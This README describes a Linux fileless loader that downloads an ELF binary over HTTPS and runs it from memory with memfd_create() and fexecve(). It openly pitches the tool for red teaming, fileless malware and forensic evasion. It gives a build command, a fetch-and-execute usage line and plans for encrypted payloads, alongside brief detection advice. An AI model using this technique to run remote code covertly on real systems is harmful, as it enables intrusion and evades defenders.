# nodiskloader

This project demonstrates how to download and execute an ELF binary directly from memory using Linux syscalls `memfd_create()` and `fexecve()`, without touching the filesystem at all.

## What It Does?

* Downloads an ELF binary via HTTPS using libcurl
* Loads it entirely into RAM
* Executes it using `fexecve()` from an anonymous file created with `memfd_create()`
* Leaves no trace on disk

This technique is commonly used in:
* Red team operations
* Fileless malware
* Memory-based sandbox evasion

---

## How It Works (short summary, the whole thing is in the blog)

1. `memfd_create("name", MFD_CLOEXEC)`
   â†’ Creates an anonymous, memory-backed file descriptor

2. `curl_easy_perform()` with a custom write callback
   â†’ Downloads the remote ELF into a memory buffer

3. `write()`
   â†’ Copies the memory buffer into the anonymous memfd

4. `fexecve(memfd, argv, envp)`
   â†’ Executes the binary directly from the memory descriptor

> `MFD_CLOEXEC` flag ensures the FD is closed automatically on exec, avoiding leaks. (We don't want to get forensic-ed, right?)

## Build the loader

```bash
gcc -o elfloader loader.c -lcurl
```

---

## Example Usage

```bash
./elfloader https://your-server.com/mybinary
```

You will see the ELF run directly from memory. No temp files, no extraction. Absolute cinema.

## Detection & Defense

Check the article for a complete guide on how to detect and mitigate this technique. In short:

* Monitor syscalls like `memfd_create`, `fexecve`
* Audit anonymous executable memory mappings
* Use EDR with behavioral detection
* Apply SELinux/AppArmor rules to block in-memory execution

## TO-DO things (that i will forget to do lmao)

* Replace the download buffer with AES-encrypted payloads (or maybe i will use XOR. or maybe both)
* Load from internal memory instead of remote source (but loading from an URL is more useful, in my opinion)
* Create a multi-architecture loader stub (Windows 11 count your days i'm coming for you)
* Use ephemeral memory for download buffer (this means the memory used to temporarily store the downloaded binary is not meant to be persistent or reusedâ€” it exists just long enough to be written to the in-memory file descriptor, and then it's freed. Doin all this to reduce forensic footprint.)

If you liked this, i don't mind a little donation. A beer in italy is like 2 or 3 dollars, and you will make a college student very happy.
